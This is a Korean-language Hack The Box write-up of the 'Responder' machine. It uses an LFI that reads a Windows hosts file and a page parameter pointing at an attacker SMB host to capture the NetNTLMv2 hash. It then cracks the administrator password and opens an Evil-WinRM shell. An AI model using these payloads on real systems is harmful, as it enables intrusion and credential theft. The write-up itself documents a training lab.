---
title: Responder Write-up
parent: Hack The Box
nav_order: 1
---

# Responder Write-up

## 머신 소개

윈도우 기반 머신으로 NTML 해시 캡처와 LFI 취약점, 해시크래킹에 대해 다룬다.

## 사용되는 툴

<br>
- Nmap
- Responder
- John the ripper
- Evil-WinRM


# Write-up
<br>

### 1.Port Scan

<br>
<figure style="text-align:center;">
    <img src="{{ '/assets/images/HTB/responder/1_포트스캔.png' | relative_url }}" style="width:600px;">
    <figcaption>port scan</figcaption>
</figure>

포트 스캔으로 아래와 같은 정보들을 얻었다.
- 80번 포트에서 http apache httpd 2.4.52 버전을 서비스 중
- 5985번 포트에서 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)를 서비스 중
> Microsoft HTTPAPI httpd 2.0
> - 윈도우 OS 내부의 HTTP 수신기 역할을 하며 WinRM, WebDAV, SSDP 등 다양한 기능의 기반이 된다. <br>
> - 타겟 머신에서는 5985번 포트에서 서비스 중이니 WinRM일 확률이 매우 높다.

> WinRM
- 윈도우에 기본 내장된 원격 관리 프로토콜로, 사용자가 원격 호스트와 통신하고 인터페이스를 구성할 수 있도록 해준다
- 원격 시스템에서 명령어를 원격으로 실행 가능하다.
하다는 특징이 있다.
- 즉, WinRM 권한이 있는 사용자의 자격 증명을 획득할 수 있다면 공격자의 호스트에서 
powershell 세션을 획득할 수 있다는 것을 의미한다.

<br>

### 2.Website Enumeration
<br>

웹 사이트에 접속하기 위해 target IP 주소로 접속해본다.

<figure style="text-align:center;">
    <img src="{{ '/assets/images/HTB/responder/2_웹사이트확인.png' | relative_url }}" style="width:600px;">
    <figcaption>타겟 웹 사이트 접속</figcaption>
</figure>

unika.htb로 자동으로 리다이렉션 되는 것이 확인된다.

이 문제를 해결하기 위해 /etc/hosts 파일에 unika.htb 도메인을 target IP 주소에 매핑하는 작업을 해주어야 한다.

<br>

<figure style="text-align:center;">
    <img src="{{ '/assets/images/HTB/responder/3_mapping.png' | relative_url }}" style="width:600px;">
    <figcaption>매핑 설정</figcaption>
</figure>

이로써 브라우저가 unika.htb라는 호스트 이름을 해당 IP주소로 해석할 수 있게 되어, 웹 페이지를 정상적으로 불러올 수 있게 되었다.

<br>

<figure style="text-align:center;">
    <img src="{{ '/assets/images/HTB/responder/4_lfi.png' | relative_url }}" style="width:600px;">
    <figcaption>URL 파라미터</figcaption>
</figure>

<br>

웹 페이지의 언어를 바꿔보면 german.html 페이지가 page 파라미터를 통해 로드 되고 있음을 발견했다.
page 입력값이 제대로 필터링 되지 않는다면 LFI 취약점이 존재할 가능성이 있다.

> LFI 취약점 : 악성 사용자의 입력값으로 인해 서버 내의 허가되지 않은 파일을 불러오거나 악성 코드를 실행할 수 있는 취약점이다.

LFI 취약점이 존재하는지 확인하기 위해 대다수 시스템에서 읽기 권한이 있는 경우가 많고 모든 windows 시스템에서 경로가 같은 파일로 테스트를 해본다.


``` C:\Windows\System32\drivers\etc\hosts ```
{: .text-center .fs-5}

<br>

<figure style="text-align:center;">
    <img src="{{ '/assets/images/HTB/responder/5_lfi.png' | relative_url }}" style="width:600px;">
    <figcaption>LFI</figcaption>
</figure>

/etc/hosts 파일이 출력된다.
이로써 LFI 취약점이 존재한다는 것을 확인할 수 있다.

<br>

### 3.NTLM
- NTLM은 마이크로소프트가 만든 인증 프로토콜이며, Active Directory 도메인에 있는 리소스에 대해 클라이언트를 인증하는 데 사용되는 챌린지-응답 인증 프로토콜이다.

> NTLM 인증 과정
> 1. 클라이언트는 사용자 이름과 도메인 이름을 서버로 보낸다.
> 2. 서버는 챌린지라고 불리는 임의의 문자열을 생성하고 클라이언트에게 보낸다.
> 3. 클라이언트는 자신의 비밀번호를 NTHash로 만들고 받은 챌린지 값을 NTHash로 암호화해서 응답을 만든다. 이 응답을 서버로 보낸다.
> 4. 서버는 SAM 또는 도메인 컨트롤러에서 해당 사용자의 NTHash를 꺼낸 다음, 같은 챌린지 값을 이용해 동일한 방식으로 응답을 계산한 뒤 클라이언트가 보낸 응답과 비교한다.
> 5. 응답값이 일치하면 로그인 성공으로 처리하고 다르면 실패로 처리한다.


<br>
**NTHash vs NTLM vs NetNTMLv2**


| 항목         | 실전 핵심 요약 |
|--------------|----------------|
| NTHash   | - 사용자의 비밀번호를 MD4 해시로 변환한 값<br> - 비밀번호의 MD4 해시<br> - SAM 또는 NTDS.dit에서 덤프 가능<br> - Pass-the-Hash 공격에 사용됨<br> - mimikatz, secretsdump.py로 추출 가능 |
| NTLM   | - 인증 프로토콜(NTLMv1/NTLMv2)<br> - 인증 과정에서 NetNTLM 응답이 생성됨<br> - LLMNR/NBNS/SMB 릴레이 공격에 쓰임<br> - 기본적으로 Kerberos보다 보안 약함 |
| NetNTLMv2| - NTLMv2 인증 시 네트워크로 전송되는 응답 메시지<br> - Responder, Inveigh, MITM6로 수집 가능<br> - Hashcat, John으로 오프라인 크래킹 가능<br> - 자격 증명 탈취 없이 크래킹 가능하므로 주요 표적 |

<br>

### 4.Responder
<br>
php 기본 설정
- allow_url_include = off
- allow_url_fopen = off

> 이러한 설정으로 HTTP, FTP 같은 외부 주소로 연결 요청을 보내지 않고 외부 파일은 안열어주지만 예외가 있다.

> SMB는 막지 못한다. php에서 SMB URL을 열면 서버가 SMB 요청을 보내게 되고 NTLM 해시도 같이 보내게 된다.

<figure style="text-align:center;">
    <img src="{{ '/assets/images/HTB/responder/6_responder.png' | relative_url }}" style="width:600px;">
    <figcaption>Responder</figcaption>
</figure>

<br>

```  http://unika.htb/index.php?page=//10.10.15.45/whatever  ```
{: .text-center .fs-5}

위의 주소를 url에 입력하면<br>

서버는 공격자의 IP주소로 SMB 접속을 시도하면서 whatever라는 폴더를 열려고 시도하게 된다.

이 과정에서 NetNTLMv2 응답이 공격자에게 넘어가게 된다.

<br>



해시값을 hash.txt 이름으로 저장하고 john the ripper 툴을 이용해 해시크래킹을 시도한다.
<br>


<figure style="text-align:center;">
    <img src="{{ '/assets/images/HTB/responder/8_hashcracking.png' | relative_url }}" style="width:600px;">
    <figcaption>해시크래킹</figcaption>
</figure>

> 획득한 계정<br>
> Administrator:badminton

<br>

### 5. WinRM
<br>
계정을 획득했으니 WinRM 서비스에 접속해서 세션을 획득해야 한다.

리눅스에는 powershell이 없으므로 Evil-WinRM을 이용해 powershell 기반의 쉘을 획득해야 한다.

> Evil-WinRM<br>
> - Windows 시스템의 WinRM 서비스를 통해 powershell 원격 세션을 획득하고 명령을 실행할 수 있게 해주는 공격 툴.

<br>
<figure style="text-align:center;">
    <img src="{{ '/assets/images/HTB/responder/9_winrm.png' | relative_url }}" style="width:600px;">
    <figcaption>Evil-WinRM</figcaption>
</figure>
<br>

![NetNTLMv2](/assets/images/HTB/responder/10_evilwinrm.png)
Evil-WinRM_2
{: .text-center}

이로써 공격 대상 시스템의 powershell에서 flag를 획득했다.

